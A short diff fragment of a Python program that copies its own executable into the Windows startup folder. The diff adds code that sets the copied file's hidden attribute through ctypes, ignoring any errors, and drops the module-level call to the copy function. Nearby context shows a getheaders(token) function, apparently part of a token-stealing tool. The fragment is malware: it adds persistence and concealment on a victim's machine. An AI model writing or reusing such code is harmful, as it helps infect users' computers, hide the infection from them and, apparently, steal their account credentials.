@@ -116,9 +116,14 @@ def copy_exe_to_startup(exe_path):
     if not os.path.exists(destination_path):
         shutil.copy2(exe_path, destination_path)
 
-exe_path = os.path.abspath(sys.argv[0])
-copy_exe_to_startup(exe_path)
-
+        if sys.platform == 'win32':
+            try:
+                import ctypes
+                FILE_ATTRIBUTE_HIDDEN = 0x02
+                ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
+            except:
+                pass
+                
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
